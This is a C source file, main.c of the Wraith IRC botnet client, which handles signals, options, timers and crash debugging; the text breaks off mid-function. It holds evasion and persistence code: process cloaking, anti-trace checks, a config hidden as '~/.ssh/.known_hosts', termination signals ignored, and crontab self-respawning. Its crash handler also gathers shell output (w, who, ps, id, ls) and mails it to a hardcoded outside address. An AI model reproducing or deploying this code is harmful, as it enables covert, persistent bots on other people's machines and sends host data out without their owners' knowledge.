/*
 * main.c -- handles:
 *   core event handling
 *   signal handling
 *   command line arguments
 *   context and assert debugging
 *
 */

#include "main.h"
#include <libgen.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <setjmp.h>
#include <unistd.h>

#ifdef HAVE_UNAME
#include <sys/utsname.h>
#endif

#ifdef STOP_UAC				/* osf/1 complains a lot */
#include <sys/sysinfo.h>
#define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
#endif
/* Some systems have a working sys/wait.h even though configure will
 * decide it's not bsd compatable.  Oh well.
 */
#include <sys/file.h>
#include <sys/stat.h>
#ifdef S_ANTITRACE
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif
#include <sys/types.h>
#include <pwd.h>

#include "chan.h"
#include "modules.h"
#include "tandem.h"
#include "bg.h"

#ifdef CYGWIN_HACKS
#include <windows.h>
#endif

#define ENCMOD "blowfish"

#ifndef _POSIX_SOURCE
/* Solaris needs this */
#define _POSIX_SOURCE 1
#endif

#ifdef HUB 
int hub = 1;
int leaf = 0;
#else
int hub = 0;
int leaf = 1;
#endif

int localhub = 1; //we set this to 0 if we have -c, later.

extern char		 origbotname[], userfile[], botnetnick[], packname[],
                         *netpass, shellhash[], myip6[], myip[], hostname[],
                         hostname6[], natip[];
extern int		 dcc_total, conmask, cache_hit, cache_miss,
			 fork_interval, 
                         local_fork_interval;
extern struct dcc_t	*dcc;
extern struct userrec	*userlist;
extern struct chanset_t	*chanset;
extern Tcl_Interp	*interp;
extern tcl_timer_t	*timer,
			*utimer;
extern jmp_buf		 alarmret;

int role;
int loading = 0;

char	egg_version[1024] = "1.0.11";
int	egg_numver = 1001100;
time_t lastfork=0;

#ifdef HUB
int my_port;
#endif

char enetpass[16] = ""; /* cheap fucking hack */
char	notify_new[121] = "";	/* Person to send a note to for new users */
int	default_flags = 0;	/* Default user flags and */
int	default_uflags = 0;	/* Default userdefinied flags for people
				   who say 'hello' or for .adduser */
int	backgrd = 1;		/* Run in the background? */
int	con_chan = 0;		/* Foreground: constantly display channel
				   stats? */
uid_t   myuid;
int	term_z = 0;		/* Foreground: use the terminal as a party
				   line? */
int checktrace = 1;		/* Check for trace when starting up? */
int pscloak = 1;
int updating = 0; /* this is set when the binary is called from itself. */
char tempdir[DIRMAX] = "";
char lock_file[40] = "";
char *binname;
int     sdebug = 0;		/* enable debug output? */
char	textdir[121] = "";	/* Directory for text files that get dumped */
time_t	online_since;		/* Unix-time that the bot loaded up */

char	owner[121] = "";	/* Permanent owner(s) of the bot */
char	pid_file[DIRMAX];		/* Name of the file for the pid to be
				   stored in */
int	save_users_at = 0;	/* How many minutes past the hour to
				   save the userfile? */
int	notify_users_at = 0;	/* How many minutes past the hour to
				   notify users of notes? */
char	version[81];		/* Version info (long form) */
char	ver[41];		/* Version info (short form) */
int	use_stderr = 1;		/* Send stuff to stderr instead of logfiles? */
int	do_restart = 0;		/* .restart has been called, restart asap */
int	resolve_timeout = 10;	/* hostname/address lookup timeout */
char	quit_msg[1024];		/* quit message */
time_t	now;			/* duh, now :) */
#ifdef S_UTCTIME
time_t  now_tmp;		/* used to convert to UTC */
#endif /* S_UTCTIME */

extern struct cfg_entry CFG_FORKINTERVAL;
#define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")


unsigned char md5out[33];
char md5string[33];

/* Traffic stats
 */
unsigned long	otraffic_irc = 0;
unsigned long	otraffic_irc_today = 0;
unsigned long	otraffic_bn = 0;
unsigned long	otraffic_bn_today = 0;
unsigned long	otraffic_dcc = 0;
unsigned long	otraffic_dcc_today = 0;
unsigned long	otraffic_filesys = 0;
unsigned long	otraffic_filesys_today = 0;
unsigned long	otraffic_trans = 0;
unsigned long	otraffic_trans_today = 0;
unsigned long	otraffic_unknown = 0;
unsigned long	otraffic_unknown_today = 0;
unsigned long	itraffic_irc = 0;
unsigned long	itraffic_irc_today = 0;
unsigned long	itraffic_bn = 0;
unsigned long	itraffic_bn_today = 0;
unsigned long	itraffic_dcc = 0;
unsigned long	itraffic_dcc_today = 0;
unsigned long	itraffic_trans = 0;
unsigned long	itraffic_trans_today = 0;
unsigned long	itraffic_unknown = 0;
unsigned long	itraffic_unknown_today = 0;

#ifdef DEBUG_CONTEXT
/* Context storage for fatal crashes */
char	cx_file[16][30];
char	cx_note[16][256];
int	cx_line[16];
int	cx_ptr = 0;
#endif


void fatal(const char *s, int recoverable)
{
  int i;
#ifdef LEAF
  module_entry *me;

  if ((me = module_find("server", 0, 0))) {
    Function *func = me->funcs;
    (func[SERVER_NUKESERVER]) (s);
  }
#endif /* LEAF */
  if (s[0])
    putlog(LOG_MISC, "*", "* %s", s);
/*  flushlogs(); */
  for (i = 0; i < dcc_total; i++) {
    if (dcc[i].sock >= 0)
      killsock(dcc[i].sock);
#ifdef HAVE_SSL
      ssl_cleanup();
#endif /* HAVE_SSL */

  }
  if (!recoverable) {
    unlink(pid_file);
    bg_send_quit(BG_ABORT);
    exit(1);
  }
}

int expmem_chanprog(), expmem_users(), expmem_config(), expmem_misc(), expmem_dccutil(),
 expmem_botnet(), expmem_tcl(), expmem_tclhash(), expmem_net(), expmem_auth(),
 expmem_modules(int), expmem_tcldcc(),
 expmem_tclmisc();

/* For mem.c : calculate memory we SHOULD be using
 */

int expected_memory(void)
{
  int tot;

  tot = expmem_chanprog() + expmem_users() + expmem_config() + expmem_misc() +
    expmem_dccutil() + expmem_botnet() + expmem_tcl() + expmem_tclhash() +
    expmem_net() + expmem_modules(0) + expmem_tcldcc() + expmem_auth() +
    expmem_tclmisc();
  return tot;
}

static void check_expired_dcc()
{
  int i;

  for (i = 0; i < dcc_total; i++)
    if (dcc[i].type && dcc[i].type->timeout_val &&
	((now - dcc[i].timeval) > *(dcc[i].type->timeout_val))) {
      if (dcc[i].type->timeout)
	dcc[i].type->timeout(i);
      else if (dcc[i].type->eof)
	dcc[i].type->eof(i);
      else
	continue;
      /* Only timeout 1 socket per cycle, too risky for more */
      return;
    }
}

#ifdef DEBUG_CONTEXT
static int	nested_debug = 0;

void write_debug()
{
  int x;
  char s[25], tmpout[150];
  int y;

  if (nested_debug) {
    /* Yoicks, if we have this there's serious trouble!
     * All of these are pretty reliable, so we'll try these.
     *
     * NOTE: dont try and display context-notes in here, it's
     *       _not_ safe <cybah>
     */
    x = creat("DEBUG.DEBUG", 0600);
    setsock(x, SOCK_NONSOCK);
    if (x >= 0) {
      strncpyz(s, ctime(&now), sizeof s);
      dprintf(-x, STR("Debug (%s) written %s\n"), ver, s);
      dprintf(-x, STR("Context: "));
      cx_ptr = cx_ptr & 15;
      for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
	dprintf(-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
      dprintf(-x, "%s/%d\n\n", cx_file[y], cx_line[y]);
      killsock(x);
      close(x);
    }
    bg_send_quit(BG_ABORT);
    exit(1);			/* Dont even try & tell people about, that may
				   have caused the fault last time. */
  } else
    nested_debug = 1;

  snprintf(tmpout, sizeof tmpout, STR("* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]"),
                                  cx_file[cx_ptr-2], cx_line[cx_ptr-2], cx_note[cx_ptr-2][0] ? cx_note[cx_ptr-2] : "",
                                  cx_file[cx_ptr-1], cx_line[cx_ptr-1], cx_note[cx_ptr-1][0] ? cx_note[cx_ptr-1] : "",
                                  cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
  putlog(LOG_MISC, "*", "%s", tmpout);
  printf("%s\n", tmpout);

  x = creat("DEBUG", 0600);
  setsock(x, SOCK_NONSOCK); 
  if (x < 0) {
    putlog(LOG_MISC, "*", STR("* Failed to write DEBUG"));
  } else {
    strncpyz(s, ctime(&now), sizeof s);
    dprintf(-x, STR("Debug (%s) written %s\n"), ver, s);
    dprintf(-x, STR("STATICALLY LINKED\n"));

    /* info library */
    dprintf(-x, "Tcl library: %s\n",
	    ((interp) && (Tcl_Eval(interp, "info library") == TCL_OK)) ?
	    interp->result : "*unknown*");

    /* info tclversion/patchlevel */
    dprintf(-x, "Tcl version: %s (header version %s)\n",
	    ((interp) && (Tcl_Eval(interp, "info patchlevel") == TCL_OK)) ?
     interp->result : (Tcl_Eval(interp, "info tclversion") == TCL_OK) ?
     interp->result : "*unknown*", TCL_PATCH_LEVEL ? TCL_PATCH_LEVEL :
     "*unknown*");

#if HAVE_TCL_THREADS
    dprintf(-x, STR("Tcl is threaded\n"));
#endif

#ifdef CCFLAGS
    dprintf(-x, STR("Compile flags: %s\n"), CCFLAGS);
#endif
#ifdef LDFLAGS
    dprintf(-x, STR("Link flags: %s\n"), LDFLAGS);
#endif
#ifdef STRIPFLAGS
    dprintf(-x, STR("Strip flags: %s\n"), STRIPFLAGS);
#endif

    dprintf(-x, STR("Context: "));
    cx_ptr = cx_ptr & 15;
    for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
      dprintf(-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
	      (cx_note[y][0]) ? cx_note[y] : "");
    dprintf(-x, "%s/%d [%s]\n\n", cx_file[cx_ptr], cx_line[cx_ptr],
	    (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
    tell_dcc(-x);
    dprintf(-x, "\n");
    debug_mem_to_dcc(-x);
    killsock(x);
    close(x);
    putlog(LOG_MISC, "*", STR("* Emailed DEBUG to bryan."));
    if (1) {
/* FIXME: make into temp file.. */
      char buff[255];
      snprintf(buff, sizeof(buff), "cat << EOFF >> bleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat DEBUG`\nEOFF", origbotname);
      system(buff);
      snprintf(buff, sizeof(buff), "cat bleh |mail wraith@shatow.net");
      system(buff);
      unlink("bleh");
    }
    unlink("DEBUG");
  }
}
#endif

static void got_bus(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("BUS ERROR -- CRASHING!"), 1);
#ifdef SA_RESETHAND
  kill(getpid(), SIGBUS);
#else
  bg_send_quit(BG_ABORT);
  exit(1);
#endif
}

static void got_segv(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("SEGMENT VIOLATION -- CRASHING!"), 1);
#ifdef SA_RESETHAND
  kill(getpid(), SIGSEGV);
#else
  bg_send_quit(BG_ABORT);
  exit(1);
#endif
}

static void got_fpe(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("FLOATING POINT ERROR -- CRASHING!"), 0);
}

static void got_term(int z)
{
#ifdef HUB
  write_userfile(-1);
#endif
  putlog(LOG_MISC, "*", STR("RECEIVED TERMINATE SIGNAL (IGNORING)"));
}

static void got_stop(int z) 
{
  putlog(LOG_MISC, "*", STR("GOT SIGSTOP POSSIBLE HIJACK."));
  exit(1);
}

static void got_abort(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal(STR("GOT SIGABRT -- CRASHING!"), 1);
#ifdef SA_RESETHAND
  kill(getpid(), SIGABRT);
#else
  bg_send_quit(BG_ABORT);
  exit(1);
#endif
}

#ifdef S_HIJACKCHECK
static void got_cont(int z) 
{
  detected(DETECT_SIGCONT, STR("POSSIBLE HIJACK DETECTED"));
}
#endif

static void got_quit(int z)
{
  putlog(LOG_MISC, "*", STR("RECEIVED QUIT SIGNAL (IGNORING)"));
  return;
}

static void got_hup(int z)
{
#ifdef HUB
  write_userfile(-1);
#endif
  putlog(LOG_MISC, "*", STR("Received HUP signal: rehashing..."));
  do_restart = -2;
  return;
}

/* A call to resolver (gethostbyname, etc) timed out
 */
static void got_alarm(int z)
{
  longjmp(alarmret, 1);

  /* -Never reached- */
}

/* Got ILL signal -- log context and continue
 */
static void got_ill(int z)
{
#ifdef DEBUG_CONTEXT
  putlog(LOG_MISC, "*", STR("* Context: %s/%d [%s]"), cx_file[cx_ptr], cx_line[cx_ptr],
                         (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
#endif
}

#ifdef DEBUG_CONTEXT
/* Context */
void eggContext(const char *file, int line, const char *module)
{
  char x[31], *p;

  p = strrchr(file, '/');
  if (!module) {
    strncpyz(x, p ? p + 1 : file, sizeof x);
  } else
    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy(cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  cx_note[cx_ptr][0] = 0;
}

/* Called from the ContextNote macro.
 */
void eggContextNote(const char *file, int line, const char *module,
		    const char *note)
{
  char x[31], *p;

  p = strrchr(file, '/');
  if (!module) {
    strncpyz(x, p ? p + 1 : file, sizeof x);
  } else
    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy(cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  strncpyz(cx_note[cx_ptr], note, sizeof cx_note[cx_ptr]);
}
#endif

#ifdef DEBUG_ASSERT
/* Called from the Assert macro.
 */
void eggAssert(const char *file, int line, const char *module)
{
  if (!module)
    putlog(LOG_MISC, "*", STR("* In file %s, line %u"), file, line);
  else
    putlog(LOG_MISC, "*", STR("* In file %s:%s, line %u"), module, file, line);
#ifdef DEBUG_CONTEXT
  write_debug();
#endif /* DEBUG_CONTEXT */
  fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
}
#endif /* DEBUG_ASSERT */

#ifdef LEAF
static void gotspawn(char *);
#endif /* LEAF */

void checkpass() 
{
  static int checkedpass = 0;
  if (!checkedpass) {
    char *gpasswd;
    MD5_CTX ctx;
    int i = 0;

    gpasswd = (char *) getpass("");
    MD5_Init(&ctx);
    MD5_Update(&ctx, gpasswd, strlen(gpasswd));
    MD5_Final(md5out, &ctx);
    for(i=0; i<16; i++)
      sprintf(md5string + (i*2), "%.2x", md5out[i]);
    if (strcmp(shellhash, md5string)) {
      fatal(STR("incorrect password."), 0);
    }
    gpasswd = 0;
    checkedpass = 1;
  }
}

void got_ed(char *, char *, char *);
extern int optind;

void gen_conf(char *filename)
{
  FILE *fp;

  if (is_file(filename) || is_dir(filename))
    fatal(STR("File already exists.."), 0);
  
  fp = fopen(filename, "w+");

  fprintf(fp, STR("#All lines beginning with '#' will be ignored during the bot startup. They are comments only.\n"));
  fprintf(fp, STR("#These lines MUST be correctly syntaxed or the bot will not work properly.\n"));
  fprintf(fp, STR("#A hub conf is located in the same dir as the hub binary, as 'conf' (encrypted)\n"));
  fprintf(fp, STR("#A leaf conf is located at '~/.ssh/.known_hosts' (encrypted)\n"));
  fprintf(fp, STR("#\n"));
  fprintf(fp, STR("#Note the \"- \" and \"+ \" for the following items, the space is REQUIRED.\n"));
  fprintf(fp, STR("#The first line must be the UID of the shell the bot is to be run on. (use \"id\" in shell to get uid)\n"));
  fprintf(fp, STR("#- 1113\n"));
  fprintf(fp, STR("#The second must be the output from uname -nv (-nr on FBSD)\n"));
  fprintf(fp, STR("#+ somebox #1 SMP Thu May 29 06:55:05 EDT 2003\n"));
  fprintf(fp, STR("#\n"));
  fprintf(fp, STR("#The following line will disable ps cloaking on the shell if you compiled with S_PSCLOAK\n"));
  fprintf(fp, STR("#!-\n"));
  fprintf(fp, STR("#The rest of the conf is for bots and is in the following syntax:\n"));
  fprintf(fp, STR("#botnick [!]ip4 [+]hostname IPv6-ip\n"));
  fprintf(fp, STR("#A . (period) can be used in place of ip4 and/or hostname if the field is not needed. (ie, for using only an ipv6 ip)\n"));
  fprintf(fp, STR("#(the ! means internal NAT ip address, IE: 10.10.0.3, Hostname REQUIRED)\n"));
  fprintf(fp, STR("#Full example:\n"));
  fprintf(fp, STR("#- 101\n"));
  fprintf(fp, STR("#+ somebox 5.1-RELEASE\n"));
  fprintf(fp, STR("#bot1 1.2.3.4 some.vhost.com\n"));
  fprintf(fp, STR("#bot2 . +ipv6.uber.leet.la\n"));
  fprintf(fp, STR("#bot3 . +another.ipv6.host.com 2001:66:669:3a4::1\n"));
  fprintf(fp, STR("#bot4 1.2.3.4 +someipv6.host.com\n"));
  fprintf(fp, STR("\n\n\n\n#if there are any trailing newlines at the end, remove them up to the last bot.\n"));
  fflush(fp);
  fclose(fp);
  printf(STR("Template config created as '%s'\n"), filename);
  exit(0);
}

void show_help()
{
  char format[81];

  egg_snprintf(format, sizeof format, "%%-30s %%-30s\n");

  printf(STR("Wraith %s\n\n"), egg_version);
  printf(format, STR("Option"), STR("Description"));
  printf(format, STR("------"), STR("-----------"));
  printf(format, STR("-e <infile> <outfile>"), STR("Encrypt infile to outfile"));
  printf(format, STR("-d <infile> <outfile>"), STR("Decrypt infile to outfile"));
  printf(format, STR("-D"), STR("Enables debug mode (see -n)"));
  printf(format, STR("-E [#/all]"), STR("Display Error codes english translation (use 'all' to display all)"));
  printf(format, STR("-g <file>"), STR("Generates a template config file"));
  printf(format, STR("-h"), STR("Display this help listing"));
/*   printf(format, STR("-k <botname>"), STR("Terminates (botname) with kill -9")); */
  printf(format, STR("-n"), STR("Disables backgrounding first bot in conf"));
  printf(format, STR("-s"), STR("Disables checking for ptrace/strace during startup (no pass needed)"));
  printf(format, STR("-t"), STR("Enables \"Partyline\" emulation (requires -n)"));
  printf(format, STR("-v"), STR("Displays bot version"));
  exit(0);
}


#ifdef LEAF
#define PARSE_FLAGS "cedghnstvPDE"
#endif /* LEAF */
#ifdef HUB
#define PARSE_FLAGS "edghnstvDE"
#endif /* HUB */
#define FLAGS_CHECKPASS "edhgntDEv"
static void dtx_arg(int argc, char *argv[])
{
  int i;
  char *p = NULL, *p2 = NULL;
  while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
    if (strchr(FLAGS_CHECKPASS, i))
      checkpass();
    switch (i) {
#ifdef LEAF
      case 'c':
        localhub = 0;
        p = argv[optind];
        if (!localhub)
          gotspawn(p);
        break;
#endif /* LEAF */
      case 'h':
        show_help();
        break; /* never reached */
      case 'g':
        p = argv[optind];
        if (p)
          gen_conf(p);
        else
          fatal(STR("You must specify a filename after -g"), 0);
        break; /* never reached */
      case 'k':
        p = argv[optind];
/*        kill_bot(p); */
        exit(0);
        break; /* never reached */
      case 'n':
	backgrd = 0;
	break;
      case 's':
        checktrace = 0;
        break;
      case 't':
        term_z = 1;
        break;
      case 'D':
        sdebug = 1;
        sdprintf(STR("debug enabled"));
        break;
      case 'E':
        p = argv[optind];
        if (p) {
          if (!strcmp(p, "all")) {
            int n;
            putlog(LOG_MISC, "*", STR("Listing all errors"));
            for (n = 1; n < ERR_MAX; n++)
              putlog(LOG_MISC, "*", STR("Error #%d: %s"), n, werr_tostr(n));
          } else {
            putlog(LOG_MISC, "*", STR("Error #%d: %s"), atoi(p), werr_tostr(atoi(p)));
          }
          exit(0);
        } else {
          fatal(STR("You must specify error number after -E (or 'all')"), 0);
        }
         break;
      case 'e':
        if (argv[optind])
          p = argv[optind];
        if (argv[optind+1])
          p2 = argv[optind+1];
        got_ed("e", p, p2);
        break; /* this should never be reached */
      case 'd':
        if (argv[optind])
          p = argv[optind];
        if (argv[optind+1])
          p2 = argv[optind+1];
        got_ed("d", p, p2);
        break; /* this should never be reached */
      case 'v':
	printf("%d\n", egg_numver);
	bg_send_quit(BG_ABORT);
	exit(0);
        break; /* this should never be reached */
#ifdef LEAF
      case 'P':
        if (getppid() != atoi(argv[optind]))
          exit(0);
        else {
          sdprintf(STR("Updating..."));
        }
        localhub = 1;
        updating = 1;
        break;
#endif
      default:
//        exit(1);
        break;
    }
  }
}

#ifdef HUB
void backup_userfile()
{
  char s[DIRMAX], s2[DIRMAX];

  putlog(LOG_MISC, "*", USERF_BACKUP);
  egg_snprintf(s, sizeof s, "%s/%s.0", tempdir, userfile);
  egg_snprintf(s2, sizeof s2, "%s/%s.1", tempdir, userfile);
  copyfile(s, s2);
  copyfile(userfile, s);
}
#endif 

/* Timer info */
static int		lastmin = 99;
static time_t		then;
static struct tm	nowtm;

/* Called once a second.
 *
 * Note:  Try to not put any Context lines in here (guppy 21Mar2000).
 */
int curcheck = 0;

void core_10secondly()
{
  curcheck++;
#ifdef LEAF
  if (localhub)
#endif /* LEAF */
    check_promisc();

  if (curcheck==1)
    check_trace(0);

#ifdef LEAF
  if (localhub) {
#endif /* LEAF */
    if (curcheck==2)
      check_last();
    if (curcheck==3) {
      check_processes();
      curcheck=0;
    }
#ifdef LEAF
  }
#endif /* LEAF */
}

void do_fork() {
  int xx;
Context;
  xx = fork();
  if (xx == -1)
    return;
  if (xx != 0) {
      FILE *fp;
      unlink(pid_file);
      fp = fopen(pid_file, "w");
      if (fp != NULL) {
        fprintf(fp, "%u\n", xx);
        fclose(fp);
      }
  }  
  if (xx) {
#if HAVE_SETPGID
    setpgid(xx, xx);
#endif
    exit(0);
  }
  lastfork = now;
}

#ifdef CRAZY_TRACE
/* This code will attach a ptrace() to getpid() hence blocking process hijackers/tracers on the pid
 * only problem.. it just creates a new pid to be traced/hijacked :\
 */
int attached = 0;
void crazy_trace() 
{
  int parent = getpid();
  int x = fork();
  if (x == -1) {
    printf("Can't fork(): %s\n", strerror(errno));
  } else if (x == 0) {
    int i;
    i = ptrace(PTRACE_ATTACH, parent, (char *) 1, 0);
    if (i == (-1) && errno == EPERM) {
      printf("CANT PTRACE PARENT: errno: %d %s, i: %d\n", errno, strerror(errno), i);
      waitpid(parent, &i, 0);
      kill(parent, SIGCHLD);
      ptrace(PTRACE_DETACH, parent, 0, 0);
      kill(parent, SIGCHLD);
      exit(0);
    } else {
      printf("SUCCESSFUL ATTACH to %d: %d\n", parent, i);
      attached++;
    }
  } else {
    printf("wait()\n");
    wait(&x);
  }
  printf("end\n");
}
#endif /* CRAZY_TRACE */

static void core_secondly()
{
  static int cnt = 0;
  int miltime, idx;

#ifdef CRAZY_TRACE 
  if (!attached) crazy_trace();
#endif /* CRAZY_TRACE */
  if (geteuid() != myuid || getuid() != myuid) {
    putlog(LOG_MISC, "*", STR("MY UID CHANGED!, POSSIBLE HIJACK ATTEMPT"));
  }
  do_check_timers(&utimer);	/* Secondly timers */
  if (fork_interval && backgrd) {
    if (now-lastfork > fork_interval)
      do_fork();
  }
  cnt++;
  if ((cnt % 3) == 0)
    call_hook(HOOK_3SECONDLY);
  if ((cnt % 10) == 0) {
    call_hook(HOOK_10SECONDLY);
    check_expired_dcc();
    if (con_chan && !backgrd) {
      dprintf(DP_STDOUT, "\033[2J\033[1;1H");
      tell_verbose_status(DP_STDOUT);
      do_module_report(DP_STDOUT, 0, "server");
      do_module_report(DP_STDOUT, 0, "channels");
      tell_mem_status_dcc(DP_STDOUT);
    }
  }
  if ((cnt % 30) == 0) {
    autolink_cycle(NULL);         /* attempt autolinks */
    call_hook(HOOK_30SECONDLY);
    cnt = 0;
  }

  for (idx = 0; idx < dcc_total; idx++) {
    if (dcc[idx].simul > 0) {
      if ((now - dcc[idx].simultime) == 60) { /* expire simuls after 60 seconds (re-uses idx, so it wont fill up) */
        dcc[idx].simul = -1;
        lostdcc(idx);
      }
    }
  }

  egg_memcpy(&nowtm, localtime(&now), sizeof(struct tm));

  if (nowtm.tm_min != lastmin) {
    int i = 0;

    /* Once a minute */
    lastmin = (lastmin + 1) % 60;
    call_hook(HOOK_MINUTELY);
    check_botnet_pings();
    check_expired_ignores();
    /* In case for some reason more than 1 min has passed: */
    while (nowtm.tm_min != lastmin) {
      /* Timer drift, dammit */
      debug2(STR("timer: drift (lastmin=%d, now=%d)"), lastmin, nowtm.tm_min);
      i++;
      lastmin = (lastmin + 1) % 60;
      call_hook(HOOK_MINUTELY);
    }
    if (i > 1)
      putlog(LOG_MISC, "*", STR("(!) timer drift -- spun %d minutes"), i);
    miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
    if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min)) {	/* 5 min */
      call_hook(HOOK_5MINUTELY);
/* 	flushlogs(); */
      if (!miltime) {	/* At midnight */
	char s[25];

	strncpyz(s, ctime(&now), sizeof s);
#ifdef HUB
	putlog(LOG_ALL, "*", STR("--- %.11s%s"), s, s + 20);
	call_hook(HOOK_BACKUP);
#endif
      }
    }
    if (nowtm.tm_min == notify_users_at)
      call_hook(HOOK_HOURLY);
    else if (nowtm.tm_min == 30)
      call_hook(HOOK_HALFHOURLY);
    /* These no longer need checking since they are all check vs minutely
     * settings and we only get this far on the minute.
     */
#ifdef HUB
    if (miltime == 300) {
      call_hook(HOOK_DAILY);
    }
#endif
  }
}

#ifdef LEAF
static void check_mypid()
{
  module_entry *me;
  FILE *fp;
  char s[15];
  int xx = 0;

  char buf2[DIRMAX];
  egg_snprintf(buf2, sizeof buf2, "%s/.pid.%s", tempdir, botnetnick);
  fp = fopen(buf2, "r");

  if (fp != NULL) {
    fgets(s, 10, fp);
    xx = atoi(s);
    if (getpid() != xx) { //we have a major problem if this is happening..
      fatal(STR("getpid() does not match pid in file. Possible cloned process, exiting.."), 1);
      if ((me = module_find("server", 0, 0))) {
        Function *func = me->funcs;
        (func[SERVER_NUKESERVER]) ("cloned process");
      }
      botnet_send_bye();
      bg_send_quit(BG_ABORT);
      exit(1);
    }
    fclose(fp); //THERE IS THE STUPID BUG OMG
  }
}
#endif

static void core_minutely()
{
#ifdef LEAF
  check_mypid();
#endif

  check_tcl_time(&nowtm);
  do_check_timers(&timer);
/*     flushlogs(); */
}

static void core_hourly()
{
}

static void core_halfhourly()
{
#ifdef HUB
  write_userfile(-1);
#endif /* HUB */
}

static void event_rehash()
{
  check_tcl_event("rehash");
}

static void event_prerehash()
{
  check_tcl_event("prerehash");
}

static void event_save()
{
  check_tcl_event("save");
}

static void event_resettraffic()
{
  otraffic_irc += otraffic_irc_today;
  itraffic_irc += itraffic_irc_today;
  otraffic_bn += otraffic_bn_today;
  itraffic_bn += itraffic_bn_today;
  otraffic_dcc += otraffic_dcc_today;
  itraffic_dcc += itraffic_dcc_today;
  otraffic_unknown += otraffic_unknown_today;
  itraffic_unknown += itraffic_unknown_today;
  otraffic_trans += otraffic_trans_today;
  itraffic_trans += itraffic_trans_today;
  otraffic_irc_today = otraffic_bn_today = 0;
  otraffic_dcc_today = otraffic_unknown_today = 0;
  itraffic_irc_today = itraffic_bn_today = 0;
  itraffic_dcc_today = itraffic_unknown_today = 0;
  itraffic_trans_today = otraffic_trans_today = 0;
}

static void event_loaded()
{
  check_tcl_event("loaded");
}

void kill_tcl();
extern module_entry *module_list;
void restart_chons();

void check_static(char *, char *(*)());

#include "mod/static.h"
int init_userrec(), init_mem(), init_dcc_max(), init_userent(), init_misc(), init_auth(), init_config(), init_bots(),
 init_net(), init_modules(), init_tcl(int, char **), init_botcmd(), init_settings();

void got_ed(char *which, char *in, char *out)
{
Context;
  sdprintf(STR("got_Ed called: -%s i: %s o: %s"), which, in, out);
  if (!in || !out)
    fatal(STR("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>"),0);
  if (!strcmp(in, out))
    fatal(STR("<infile> should NOT be the same name as <outfile>"), 0);
  if (!strcmp(which, "e")) {
    EncryptFile(in, out);
    fatal(STR("File Encryption complete"),3);
  } else if (!strcmp(which, "d")) {
    DecryptFile(in, out);
    fatal(STR("File Decryption complete"),3);
  }
  exit(0);
}

static inline void garbage_collect(void)
{
  static u_8bit_t	run_cnt = 0;

  if (run_cnt == 3)
    garbage_collect_tclhash();
  else
    run_cnt++;
}

int crontab_exists() {
  char buf[2048], *out=NULL;
  sprintf(buf, STR("crontab -l | grep \"%s\" | grep -v \"^#\""), binname);
  if (shell_exec(buf, NULL, &out, NULL)) {

    if (out && strstr(out, binname)) {
      nfree(out);
      return 1;
    } else {
      if (out)
        nfree(out);
      return 0;
    }
  } else
    return (-1);
}
void crontab_create(int interval) {
  char tmpfile[161],
    buf[256];
  FILE *f;
  int fd;

  /* always use mkstemp() when handling temp files! -dizz */
  sprintf(tmpfile, STR("%s.crontab-XXXXXX"), tempdir);
  if ((fd = mkstemp(tmpfile)) == -1) {
    unlink(tmpfile);
    return;
  } 

  sprintf(buf, STR("crontab -l | grep -v \"%s\" | grep -v \"^#\" | grep -v \"^\\$\"> %s"), binname, tmpfile);
  if (shell_exec(buf, NULL, NULL, NULL) && (f = fdopen(fd, "a")) != NULL) {
    buf[0] = 0;
    if (interval == 1)
      strcpy(buf, "*");
    else {
      int i = 1;
      int si = random() % interval;

      while (i < 60) {
        if (buf[0])
          sprintf(buf + strlen(buf), STR(",%i"), (i + si) % 60);
        else
          sprintf(buf, "%i", (i + si) % 60);
        i += interval;
      }
    }
    sprintf(buf + strlen(buf), STR(" * * * * %s > /dev/null 2>&1"), binname);
    fseek(f, 0, SEEK_END);
    fprintf(f, STR("\n%s\n"), buf);
    fclose(f);
    sprintf(buf, STR("crontab %s"), tmpfile);
    shell_exec(buf, NULL, NULL, NULL);
  }
  close(fd);
  unlink(tmpfile);

}

static void check_crontab()
{
  int i = 0;

#ifdef LEAF
  if (!localhub) 
    fatal(STR("something is wrong."), 0);
#endif /* LEAF */
  i=crontab_exists();
  if (!i) {
    crontab_create(5);
    i=crontab_exists();
    if (!i)
      printf(STR("* Error writing crontab entry.\n"));
  }
}

#ifdef LEAF
static void gotspawn(char *filename)
{
  FILE *fp;
  char templine[8192], *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL, *temps;

  if (!(fp = fopen(filename, "r")))
    fatal(STR("Cannot read from local config (2)"), 0);

  while(fscanf(fp,"%[^\n]\n",templine) != EOF) {
    void *my_ptr;
